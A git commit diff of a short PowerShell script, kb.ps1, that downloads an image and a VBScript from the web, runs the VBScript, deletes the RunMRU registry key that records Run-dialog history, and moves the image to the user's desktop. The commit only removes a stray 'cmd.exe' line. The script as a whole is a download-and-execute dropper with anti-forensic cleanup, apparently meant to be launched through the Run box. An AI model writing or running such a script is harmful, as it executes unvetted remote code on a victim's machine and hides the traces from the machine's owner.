db302cf8df296acd9a87243a86de9a29bb3bdebb
calebpmiller <calebpmiller@users.noreply.github.com>
2018-12-07 11:07:54 -0500

    Update kb.ps1

--- kb.ps1
+++ kb.ps1
@@ -1,6 +1,6 @@
 (new-object System.Net.WebClient).Downloadfile("https://i.ytimg.com/vi/qyYHWkVWQ4o/maxresdefault.jpg","C:\temp\kb.jpg")
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/kb.vbs","C:\temp\kb.vbs")
 Start-Process -FilePath C:\temp\kb.vbs
-cmd.exe
+
 cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
 cmd /c move C:\temp\kb.jpg "%USERPROFILE%\Desktop\"
